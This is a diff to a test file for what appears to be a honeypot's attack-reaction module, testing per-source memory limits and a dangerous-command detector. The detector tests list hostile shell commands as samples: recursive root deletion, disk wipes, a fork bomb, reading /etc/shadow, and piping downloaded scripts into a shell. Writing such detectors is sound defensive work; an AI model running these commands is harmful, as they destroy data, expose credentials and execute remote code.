@@ -1,6 +1,7 @@
 import { describe, expect, it } from 'vitest';
 import {
-  ReactionMemory, isDangerousCommand, STORM_THRESHOLD, STORM_WINDOW_MS, type AttackPayload,
+  ReactionMemory, isDangerousCommand, STORM_THRESHOLD, STORM_WINDOW_MS,
+  MAX_REACTION_KEYS, MAX_REACTION_HITS, type AttackPayload,
 } from './reactions';
 
 /** Базовый payload атаки; перекрываем только нужные поля. */
@@ -10,6 +11,36 @@ const pay = (over: Partial<AttackPayload> = {}): AttackPayload => ({
 });
 
 describe('ReactionMemory: нарастание по ленте', () => {
+  it('удаляет истёкшие адреса при событии другого типа и другого источника', () => {
+    const m = new ReactionMemory();
+    for (let i = 0; i < 100; i++) m.enrich('attack:connect', pay({ ip: `source-${i}` }), 0);
+    m.enrich('attack:command', pay({ ip: 'new-source', command: 'ls' }), STORM_WINDOW_MS);
+    // Проверяем освобождение памяти, а не только внешний сброс счётчика.
+    expect(Reflect.get(m, 'hits').size).toBe(0);
+  });
+
+  it('при переполнении вытесняет старый адрес, сохраняя недавно обновлённый', () => {
+    const m = new ReactionMemory();
+    for (let i = 0; i < MAX_REACTION_KEYS; i++) m.enrich('attack:connect', pay({ ip: `source-${i}` }), 0);
+    expect(m.enrich('attack:connect', pay({ ip: 'source-0' }), 1).repeat).toBe(2);
+    m.enrich('attack:connect', pay({ ip: 'overflow' }), 2);
+    expect(Reflect.get(m, 'hits').size).toBe(MAX_REACTION_KEYS);
+    expect(m.enrich('attack:connect', pay({ ip: 'source-0' }), 3).repeat).toBe(3);
+    expect(m.enrich('attack:connect', pay({ ip: 'source-1' }), 4).repeat).toBe(1);
+  });
+
+  it('ограничивает метки одного источника и не повторяет тревогу при насыщении', () => {
+    const m = new ReactionMemory();
+    let milestones = 0;
+    for (let i = 0; i < MAX_REACTION_HITS * 3; i++) {
+      const e = m.enrich('attack:auth', pay(), 0);
+      if (e.milestone) milestones++;
+      expect(e.repeat).toBe(Math.min(i + 1, MAX_REACTION_HITS));
+    }
+    expect(milestones).toBe(1);
+    expect(Reflect.get(m, 'hits').get('attack:auth:192.0.2.1')).toHaveLength(MAX_REACTION_HITS);
+    expect(m.enrich('attack:auth', pay(), STORM_WINDOW_MS).repeat).toBe(1);
+  });
   it('считает однотипные события с адреса в окне, растёт repeat', () => {
     const m = new ReactionMemory();
     expect(m.enrich('attack:connect', pay(), 0).repeat).toBe(1);
@@ -79,7 +110,9 @@ describe('ReactionMemory: нарастание по ленте', () => {
 describe('isDangerousCommand', () => {
   it('ловит опасные шаблоны и снимает управляющие символы', () => {
     for (const cmd of [
-      'rm -rf /', 'rm -fr /home', 'mkfs.ext4 /dev/sda', 'dd if=/dev/zero of=/dev/sda',
+      'rm -rf /', 'rm -fr /home', 'rm -r -f /', 'rm -f -r /', 'rm -f -R /',
+      'sudo /bin/rm -v -r -f /tmp/demo', 'rm\t-r\t-f /tmp/demo', 'rm -rf;',
+      'mkfs.ext4 /dev/sda', 'dd if=/dev/zero of=/dev/sda',
       ':(){ :|:& };:', 'chmod 777 /etc', 'cat /etc/passwd', 'cat /etc/shadow',
       'wget http://x/a.sh | sh', 'curl http://x/a | bash', 'cat x > /dev/sda',
       '\u001b[31mrm -rf /\u001b[0m',
@@ -89,7 +122,9 @@ describe('isDangerousCommand', () => {
   });
 
   it('безопасные команды не тревожат', () => {
-    for (const cmd of ['ls -la', 'whoami', 'uname -a', 'cat readme.txt', 'echo hi', '']) {
+    for (const cmd of ['ls -la', 'whoami', 'uname -a', 'cat readme.txt', 'echo hi', '',
+      'rm -r file-f', 'rm -f file-r', 'rm -- -rf', 'rm -r -- -f',
+      'rm -r; echo -f', 'rm -r\necho -f']) {
       expect(isDangerousCommand(cmd), cmd).toBe(false);
     }
   });
